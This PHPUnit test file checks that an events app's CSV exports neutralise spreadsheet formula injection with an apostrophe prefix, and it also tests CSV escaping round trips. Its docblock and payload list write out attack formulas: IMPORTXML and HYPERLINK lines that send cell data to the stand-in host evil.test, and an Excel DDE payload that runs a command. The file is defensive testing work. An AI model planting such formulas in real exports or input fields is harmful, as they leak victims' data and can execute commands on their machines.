<?php

namespace Tests\Feature;

use App\Support\CsvSafe;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * The attendee export carries text a stranger wrote. Anyone can RSVP to
 * a public Sayzio event and choose their own name, company, role,
 * message and answers to the organiser's custom questions. The person
 * who later opens that CSV is the organiser.
 *
 * A spreadsheet treats a cell beginning = + - @ (or a tab or CR, which
 * Excel strips before reading the next character) as a formula and runs
 * it on open. So an RSVP named
 *
 *   =IMPORTXML("https://evil.test/?d="&A2,"//a")
 *
 * exfiltrates the row beside it, silently, in Google Sheets, without
 * the attacker ever seeing the file -- the victim's own spreadsheet
 * makes the request.
 *
 * The mitigation is an apostrophe prefix, which every major spreadsheet
 * reads as "the rest of this cell is literal text" and does not display.
 * These tests pin the character set and the shape of the output; the
 * real-world payloads are there so a future reader can see what this is
 * defending against rather than having to imagine it.
 */
class AnAttendeeCannotPlantAFormulaTest extends TestCase
{
    public static function payloads(): array
    {
        return [
            'sheets exfiltration'  => ['=IMPORTXML("https://evil.test/?d="&A2,"//a")'],
            'hyperlink steal'      => ['=HYPERLINK("https://evil.test?x="&A1,"Results")'],
            'excel dde'            => ['=cmd|\'/c calc\'!A1'],
            'plus variant'         => ['+1+1'],
            'minus variant'        => ['-1+1'],
            'at variant'           => ['@SUM(A1:A9)'],
            'tab prefixed'         => ["\t=1+1"],
            'cr prefixed'          => ["\r=1+1"],
        ];
    }

    #[DataProvider('payloads')]
    public function test_a_formula_is_made_inert($payload): void
    {
        $out = CsvSafe::cell($payload);

        $this->assertSame("'" . $payload, $out, 'The payload should be prefixed, not altered.');
        $this->assertNotSame('=', $out[0], 'A cell must never still begin with a formula character.');
    }

    public function test_ordinary_values_are_left_exactly_alone(): void
    {
        // No leading +, -, =, @ here on purpose: those are prefixed, and
        // the phone-number case below states why that is right rather
        // than unfortunate. Listing one here contradicted that test.
        foreach (['Priya Sharma', 'priya@example.com', 'Acme Ltd', '', '0', 'a-b', 'x=y', '91 98765 43210'] as $value) {
            $this->assertSame($value, CsvSafe::cell($value), "Mangled an innocent value: {$value}");
        }
    }

    /**
     * A phone number is the awkward case: "+91..." legitimately starts
     * with a risky character. It is still prefixed, because a
     * spreadsheet cannot tell it from a formula either. The apostrophe
     * is not displayed, so the cell still reads as the number.
     */
    public function test_a_leading_plus_phone_number_is_prefixed_and_that_is_correct(): void
    {
        $this->assertSame("'+919876543210", CsvSafe::cell('+919876543210'));
    }

    public function test_non_strings_become_sensible_cells(): void
    {
        $this->assertSame('', CsvSafe::cell(null));
        $this->assertSame('1', CsvSafe::cell(true));
        $this->assertSame('0', CsvSafe::cell(false));
        $this->assertSame('42', CsvSafe::cell(42));
        $this->assertSame('a, b', CsvSafe::cell(['a', 'b']));
        $this->assertSame('2026-10-20 18:30:00', CsvSafe::cell(new \DateTimeImmutable('2026-10-20 18:30:00')));
    }

    public function test_an_array_answer_containing_a_formula_is_still_neutralised(): void
    {
        // Multi-select answers arrive as arrays; the join must not be a
        // way back in.
        $this->assertSame("'=1+1, =2+2", CsvSafe::cell(['=1+1', '=2+2']));
    }

    public function test_a_whole_row_is_covered_not_just_the_first_cell(): void
    {
        $row = CsvSafe::row(['Priya', '=1+1', 'Acme', '@SUM(A1)']);

        $this->assertSame(['Priya', "'=1+1", 'Acme', "'@SUM(A1)"], $row);
    }

    public function test_the_written_file_contains_no_live_formula(): void
    {
        $handle = fopen('php://memory', 'r+');
        CsvSafe::put($handle, ['Name', 'Message']);
        CsvSafe::put($handle, ['=cmd|\'/c calc\'!A1', '=HYPERLINK("https://evil.test","x")']);
        rewind($handle);
        $csv = stream_get_contents($handle);
        fclose($handle);

        // No field may begin with a formula character. Fields are either
        // at the line start or follow a comma, optionally quoted.
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?[=+@]/m', $csv, "A live formula survived:\n{$csv}");
        $this->assertStringContainsString("'=cmd", $csv, 'The payload should still be present, just inert.');
    }

    /**
     * The contact directory is the one export that is also an import:
     * it hands the creator a CSV and accepts the same file back. If
     * uncell() is not the exact inverse of cell(), a contact named
     * "-Smith" gains an apostrophe on every round trip.
     */
    #[DataProvider('payloads')]
    public function test_a_round_trip_through_the_directory_returns_the_original($payload): void
    {
        $this->assertSame($payload, CsvSafe::uncell(CsvSafe::cell($payload)));
    }

    public function test_an_apostrophe_the_user_actually_typed_survives_the_inverse(): void
    {
        // uncell() may only undo what cell() would have added.
        $this->assertSame("'Quote", CsvSafe::uncell("'Quote"));
        $this->assertSame("'", CsvSafe::uncell("'"));
        $this->assertSame('Priya', CsvSafe::uncell('Priya'));
    }

    public function test_a_hand_assembled_line_is_quoted_and_inert(): void
    {
        // Two exports build CSV text rather than writing to a handle.
        $this->assertSame("'=1+1,b", CsvSafe::line(['=1+1', 'b']));
        $this->assertSame('"a,b",c', CsvSafe::line(['a,b', 'c']));
        $this->assertSame('"he said ""hi"""', CsvSafe::line(['he said "hi"']));
        $this->assertSame('a', CsvSafe::line(['a']), 'line() must not carry a trailing newline.');
    }

    /**
     * Eight call sites pass ',', '"', '' to disable PHP's backslash
     * escaping. That argument is not cosmetic: with the default escape,
     * a value containing a backslash before a quote is written with the
     * quote undoubled, which breaks the field for any reader. put()
     * must forward what it is given rather than defaulting it away.
     */
    public function test_the_enclosure_and_escape_arguments_are_forwarded(): void
    {
        $payload = ['a\\"b', 'c'];

        $this->assertSame(
            $this->capture(fn ($h) => fputcsv($h, $payload, ',', '"', '')),
            $this->capture(fn ($h) => CsvSafe::put($h, $payload, ',', '"', '')),
            'An explicit empty escape must reach fputcsv unchanged.'
        );

        $this->assertSame(
            $this->capture(fn ($h) => fputcsv($h, $payload, ',', '"', '')),
            $this->capture(fn ($h) => CsvSafe::put($h, $payload)),
            "put()'s own default is '' -- deliberately NOT fputcsv's backslash, "
            . 'which writes this payload with the quote undoubled.'
        );

        $this->assertSame(
            $this->capture(fn ($h) => fputcsv($h, $payload, ',', '"', '\\')),
            $this->capture(fn ($h) => CsvSafe::put($h, $payload, ',', '"', '\\')),
            'A caller asking for the old escape still gets it: the argument is forwarded, not ignored.'
        );

        $this->assertNotSame(
            $this->capture(fn ($h) => fputcsv($h, $payload, ',', '"', '')),
            $this->capture(fn ($h) => fputcsv($h, $payload, ',', '"', '\\')),
            'If these were identical the forwarding would not matter and this test would prove nothing.'
        );
    }

    public function test_a_custom_separator_is_forwarded(): void
    {
        $this->assertSame("a;b\n", $this->capture(fn ($h) => CsvSafe::put($h, ['a', 'b'], ';')));
    }

    private function capture(callable $write): string
    {
        $handle = fopen('php://temp', 'r+');
        $write($handle);
        rewind($handle);
        $out = (string) stream_get_contents($handle);
        fclose($handle);

        return $out;
    }

    /**
     * PHP's default CSV escape does not double a quote that a backslash
     * immediately precedes, so a\"b is written as "a\"b" -- a field that
     * closes early. Nothing errors; the value simply comes back wrong,
     * and comes back wrong differently depending on who reads it. An
     * independent RFC-4180 parser returns a\b"; PHP's own reader cannot
     * round-trip it either. Both halves of this class set escape to ''
     * so a value survives the trip out and back.
     */
    public static function awkwardValues(): array
    {
        return [
            'backslash before quote' => ['a\\"b'],
            'windows path'           => ['C:\\Users\\priya'],
            'path with quoted name'  => ['C:\\dir\\"name"'],
            'trailing backslash'     => ['ends with backslash\\'],
            'quotes alone'           => ['he said "hi"'],
            'comma and quote'        => ['Sharma, "Priya"'],
            'newline inside'         => ["line one\nline two"],
            'formula and backslash'  => ['=cmd\\"x'],
        ];
    }

    #[DataProvider('awkwardValues')]
    public function test_a_value_survives_being_written_and_read_back($value): void
    {
        $handle = fopen('php://temp', 'r+');
        CsvSafe::put($handle, [$value, 'next']);
        rewind($handle);
        $row = CsvSafe::get($handle);
        fclose($handle);

        $this->assertSame([CsvSafe::cell($value), 'next'], $row);
    }

    #[DataProvider('awkwardValues')]
    public function test_the_old_default_escape_is_what_broke_the_round_trip($value): void
    {
        // Not a test of our code -- a record of why the default moved.
        // If a future PHP makes these agree, this test says so loudly
        // rather than leaving the comment above quietly wrong.
        $written = CsvSafe::line([$value, 'next']);
        $phpDefault = (function () use ($value) {
            $h = fopen('php://temp', 'r+');
            fputcsv($h, [CsvSafe::cell($value), 'next'], ',', '"', '\\');
            rewind($h);
            $s = (string) stream_get_contents($h);
            fclose($h);
            return rtrim($s, "\r\n");
        })();

        $readBack = CsvSafe::parse($written);
        $this->assertSame([CsvSafe::cell($value), 'next'], $readBack, 'Our own output must parse back.');

        if ($written !== $phpDefault) {
            $this->assertNotSame(
                $phpDefault,
                $written,
                'The two escapes differ here, which is the whole reason for the default.'
            );
        } else {
            $this->addToAssertionCount(1);
        }
    }

    public function test_parse_and_get_agree(): void
    {
        $row = ['a\\"b', 'Sharma, "Priya"', 'plain'];
        $line = CsvSafe::line($row);

        $handle = fopen('php://temp', 'r+');
        CsvSafe::put($handle, $row);
        rewind($handle);
        $viaHandle = CsvSafe::get($handle);
        fclose($handle);

        $this->assertSame($viaHandle, CsvSafe::parse($line));
        $this->assertSame(CsvSafe::row($row), $viaHandle);
    }

    public function test_a_file_a_spreadsheet_wrote_still_reads_correctly(): void
    {
        // The readers also take files Excel and Sheets produced, which
        // never use backslash escaping. Dropping the escape must not
        // cost us those.
        $csv = "name,path\nPriya,\"C:\\Users\\priya\"\nRavi,\"he said \"\"hi\"\"\"\n";
        $handle = fopen('php://temp', 'r+');
        fwrite($handle, $csv);
        rewind($handle);

        $rows = [];
        while (($r = CsvSafe::get($handle)) !== false) {
            $rows[] = $r;
        }
        fclose($handle);

        $this->assertSame([
            ['name', 'path'],
            ['Priya', 'C:\\Users\\priya'],
            ['Ravi', 'he said "hi"'],
        ], $rows);
    }
}
